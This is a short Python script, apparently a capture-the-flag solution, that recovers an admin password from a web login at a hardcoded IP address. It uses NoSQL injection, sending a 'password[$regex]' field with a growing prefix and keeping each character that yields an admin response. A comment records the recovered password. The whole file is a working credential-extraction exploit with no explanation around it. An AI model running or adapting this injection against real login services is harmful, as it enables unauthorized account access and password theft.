import requests
import string
#pass : h4ckf3st2k17z

flag = "h"
url = "http://151.80.148.24:8001/"

restart = True

while restart:
    restart = False
    for i in string.ascii_letters + string.digits:
        payload = flag + i
        post_data = {'username': 'admin', 'password[$regex]': payload + ".*"}
        r = requests.post(url, data=post_data, allow_redirects=True)
        cont =  r.content
        if "admin" in cont:
            print payload 
            restart = True
            break